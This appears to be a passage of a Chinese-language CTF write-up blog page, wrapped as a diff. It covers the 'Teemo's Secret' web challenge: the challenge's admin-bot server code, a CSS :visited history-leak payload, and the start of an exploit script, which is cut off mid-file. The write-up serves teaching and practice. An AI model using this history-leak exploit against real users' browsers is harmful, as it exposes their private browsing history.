@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all這場沒打到很多，執著在一題上了，來補下 XD最近不是懶惰沒更新，是在準備 CPTS 和一堆瑣事   WebTeemo’s Secret一開始會給一千把密碼，其中一把密碼可以解鎖 FLAG 但 one shotAdmin Bot 會先用 firefox 開啟 http:&#x2F;&#x2F;server&#x2F;密碼 的路徑才造訪你的網站，最後把最左上角的一個像素給 return 回來。server.py">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Smiley CTF 2025 Note">
+<meta property="og:url" content="http://wha13.github.io/2025/06/19/2025-smiley-ctf/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all這場沒打到很多，執著在一題上了，來補下 XD最近不是懶惰沒更新，是在準備 CPTS 和一堆瑣事   WebTeemo’s Secret一開始會給一千把密碼，其中一把密碼可以解鎖 FLAG 但 one shotAdmin Bot 會先用 firefox 開啟 http:&#x2F;&#x2F;server&#x2F;密碼 的路徑才造訪你的網站，最後把最左上角的一個像素給 return 回來。server.py">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1yhkL-4le.png">
+<meta property="article:published_time" content="2025-06-19T06:02:02.000Z">
+<meta property="article:modified_time" content="2025-06-24T05:55:33.224Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="RSA">
+<meta property="article:tag" content="XSLeak">
+<meta property="article:tag" content="LLL">
+<meta property="article:tag" content="firefox">
+<meta property="article:tag" content="scroll-to-text-fragment">
+<meta property="article:tag" content="LCG">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/B1yhkL-4le.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Smiley CTF 2025 Note</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/04/pwn-college-v8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2025/06/19/2025-smiley-ctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&text=Smiley CTF 2025 Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&is_video=false&description=Smiley CTF 2025 Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Smiley CTF 2025 Note&body=Check out this article: http://wha13.github.io/2025/06/19/2025-smiley-ctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&title=Smiley CTF 2025 Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&name=Smiley CTF 2025 Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2025/06/19/2025-smiley-ctf/&t=Smiley CTF 2025 Note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Teemo%E2%80%99s-Secret"><span class="toc-number">2.1.</span> <span class="toc-text">Teemo’s Secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaf"><span class="toc-number">2.2.</span> <span class="toc-text">Leaf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LCGs-are-SBGs"><span class="toc-number">3.1.</span> <span class="toc-text">LCGs are SBGs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#a-special-place-in-reality"><span class="toc-number">3.2.</span> <span class="toc-text">a special place in reality</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Smiley CTF 2025 Note
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-19T06:02:02.000Z" class="dt-published" itemprop="datePublished">2025-06-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Cryptography/" rel="tag">Cryptography</a>, <a class="p-category" href="/tags/LCG/" rel="tag">LCG</a>, <a class="p-category" href="/tags/LLL/" rel="tag">LLL</a>, <a class="p-category" href="/tags/RSA/" rel="tag">RSA</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/XSLeak/" rel="tag">XSLeak</a>, <a class="p-category" href="/tags/firefox/" rel="tag">firefox</a>, <a class="p-category" href="/tags/scroll-to-text-fragment/" rel="tag">scroll-to-text-fragment</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這場沒打到很多，執著在一題上了，來補下 XD<br><del>最近不是懶惰沒更新，是在準備 CPTS 和一堆瑣事</del>  </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Teemo’s-Secret"><a href="#Teemo’s-Secret" class="headerlink" title="Teemo’s Secret"></a>Teemo’s Secret</h3><p>一開始會給一千把密碼，其中一把密碼可以解鎖 FLAG 但 one shot<br>Admin Bot 會先用 firefox 開啟 <a target="_blank" rel="noopener" href="http://server/%E5%AF%86%E7%A2%BC">http://server/密碼</a> 的路徑才造訪你的網站，最後把最左上角的一個像素給 return 回來。<br><strong>server.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> base64, sys, secrets</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.firefox.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line">bot_lock = Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PORT = <span class="number">7382</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line">flags = [secrets.token_hex(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line">flag_access = secrets.choice(flags)</span><br><span class="line"></span><br><span class="line">gamble_chance = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;Referrer-Policy&#x27;</span>] = <span class="string">&#x27;no-referrer&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_flags</span>():</span><br><span class="line">    response = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flags:</span><br><span class="line">        response += <span class="string">f&#x27;&lt;a href=&quot;/<span class="subst">&#123;i&#125;</span>&quot;&gt;<span class="subst">&#123;i&#125;</span>&lt;/a&gt;&lt;br&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> make_response(response, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gamble&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gamble</span>():</span><br><span class="line">    <span class="keyword">global</span> gamble_chance</span><br><span class="line">    <span class="keyword">if</span> gamble_chance &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No more chances left&#x27;</span>, <span class="number">403</span></span><br><span class="line">    access = request.args.get(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> access:</span><br><span class="line">        gamble_chance -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;flag&#x27;</span>) == flag_access:</span><br><span class="line">            gamble_chance = <span class="number">3</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;You won! Your flag is: <span class="subst">&#123;flag&#125;</span>.&#x27;</span>, <span class="number">200</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You lost! Try again.&#x27;</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:data&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">data</span>):</span><br><span class="line">    response = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(response, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bot&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bot_lock.acquire(blocking=<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;please wait admin bot to finish running&#x27;</span>, <span class="number">429</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.args.get(<span class="string">&#x27;address&#x27;</span>, <span class="string">&#x27;http://example.com/&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        data = base64.b64decode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        url = urlparse(data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> url.scheme <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid URL scheme&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">        url = data.strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Visiting &#x27;</span> + url, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">        firefox_options = Options()</span><br><span class="line">        firefox_options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">        firefox_options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    </span><br><span class="line">        driver = webdriver.Firefox(options=firefox_options)</span><br><span class="line">        </span><br><span class="line">        driver.get(<span class="string">&#x27;http://127.0.0.1:7382/&#x27;</span>)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&#x27;http://127.0.0.1:7382/&#x27;</span>+flag_access)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">        driver.switch_to.new_window(<span class="string">&#x27;tab&#x27;</span>)</span><br><span class="line">        driver.switch_to.window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Visiting URL&#x27;</span>, url, file=sys.stderr)</span><br><span class="line">        driver.get(url)</span><br><span class="line">    </span><br><span class="line">        wait = WebDriverWait(driver, <span class="number">10</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            wait.until(<span class="keyword">lambda</span> d: <span class="string">&#x27;loaded&#x27;</span> <span class="keyword">in</span> d.title.lower())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Error waiting for page to load:&#x27;</span>, e, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">        driver.get(url)</span><br><span class="line">        driver.save_screenshot(<span class="string">&#x27;screenshot.png&#x27;</span>)</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Done visiting URL&#x27;</span>, url, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">        image = Image.<span class="built_in">open</span>(<span class="string">&#x27;screenshot.png&#x27;</span>)</span><br><span class="line">        <span class="comment"># opps I fucked it up</span></span><br><span class="line">        screenshot_data = image.crop((<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>)).tobytes()</span><br><span class="line">        response = make_response(screenshot_data, <span class="number">200</span>)</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bot_lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=PORT, debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>蠻典型的 <code>:visited</code> trick，平常造訪過的連結都會變色，透過魔改 CSS 來 leak 造訪紀錄，最近 chrome 才剛說要廢除的東西 :rofl:<br><a target="_blank" rel="noopener" href="https://developer.chrome.com/blog/visited-links?hl=zh-tw">https://developer.chrome.com/blog/visited-links?hl=zh-tw</a><br>XSLeak WIKI: <a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history">https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history</a><br>可愛的 Whack A Mole，反正只要透過修改 CSS 中的 <code>mix-blend-mode</code> 屬性，就可以透過疊加出來的顏色判斷是否受點擊，我直接選用原作中的 <code>multiply</code> 屬性修改，並用 CSS 給他調到左上角變大正方形。（注意，一定要先設定好原始的 <code>a</code> tag 屬性才可以改 visted）<br>最後因為一千把鑰匙太多了，我用二分搜的方法篩。  </p>
+<p><strong>payload.html</strong>  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>meow<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">mix-blend-mode</span>: multiply;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>WAITREPLACEHEHE<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;loaded&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;, <span class="number">3000</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>exp.py</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py &lt;instance url&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">target_url = sys.argv[<span class="number">1</span>]</span><br><span class="line">os.system(<span class="string">f&quot;wget &#x27;<span class="subst">&#123;target_url&#125;</span>&#x27; -O origin.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;origin.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    html = f.read()</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line">urls = []</span><br><span class="line"><span class="keyword">for</span> a_tag <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>, href=<span class="literal">True</span>):</span><br><span class="line">    urls.append(a_tag[<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span 